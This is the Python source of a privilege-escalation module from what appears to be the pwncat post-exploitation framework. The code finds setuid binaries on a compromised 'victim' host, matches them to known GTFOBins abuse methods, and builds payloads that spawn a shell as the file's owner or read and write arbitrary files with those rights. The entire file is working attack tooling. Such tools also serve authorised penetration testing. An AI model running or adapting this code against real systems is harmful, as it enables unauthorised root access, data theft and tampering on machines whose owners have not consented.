#!/usr/bin/env python3
import os
from typing import List, BinaryIO

from colorama import Fore

import pwncat
from pwncat import util
from pwncat.util import console
from pwncat.gtfobins import Stream, Capability, BinaryNotFound
from pwncat.privesc import BaseMethod, Technique, PrivescError


class Method(BaseMethod):

    name = "setuid"
    id = "setuid"
    BINARIES = ["find"]

    def enumerate(
        self, progress, task, caps: Capability = Capability.ALL
    ) -> List[Technique]:
        """ Find all techniques known at this time """

        for suid in pwncat.victim.enumerate.iter("suid"):

            progress.update(task, step=str(suid.data))

            try:
                binary = pwncat.victim.gtfo.find_binary(suid.data.path, caps)
            except BinaryNotFound:
                continue

            for method in binary.iter_methods(suid.data.path, caps, Stream.ANY):
                yield Technique(
                    suid.data.owner.name, self, method, method.cap,
                )

    def execute(self, technique: Technique):
        """ Run the specified technique """

        method = technique.ident

        # Build the payload
        payload, input_data, exit_cmd = method.build(
            shell=pwncat.victim.shell, suid=True
        )

        # Run the start commands
        pwncat.victim.run(payload, wait=False)

        # Send required input
        pwncat.victim.client.send(input_data.encode("utf-8"))

        # remember how to close out of this privesc
        return exit_cmd

    def read_file(self, filepath: str, technique: Technique) -> BinaryIO:

        method = technique.ident

        payload, input_data, exit_cmd = method.build(lfile=filepath, suid=True)

        mode = "r"
        if method.stream is Stream.RAW:
            mode += "b"

        # Send the read payload
        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        # Wrap the stream in case this is an encoded read
        pipe = method.wrap_stream(pipe)

        return pipe

    def write_file(self, filepath: str, data: bytes, technique: Technique):

        method = technique.ident

        payload, input_data, exit_cmd = method.build(
            lfile=filepath, length=len(data), suid=True
        )

        mode = "w"
        if method.stream is Stream.RAW:
            mode += "b"

        try:
            # data_printable = data.decode("utf-8").isprintable()
            # Use the custom `util.isprintable()` so we can keep newlines
            data_printable = util.isprintable(data)

        except UnicodeDecodeError:
            data_printable = False

        if method.stream == Stream.PRINT and not data_printable:
            raise PrivescError(f"{technique}: input data not printable")

        # Send the read payload
        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        # Wrap the stream in case this is an encoded write
        with method.wrap_stream(pipe) as pipe:
            pipe.write(data)

    def get_name(self, tech: Technique):
        return f"[cyan]{tech.ident.binary_path}[/cyan] ([red]setuid[/red])"
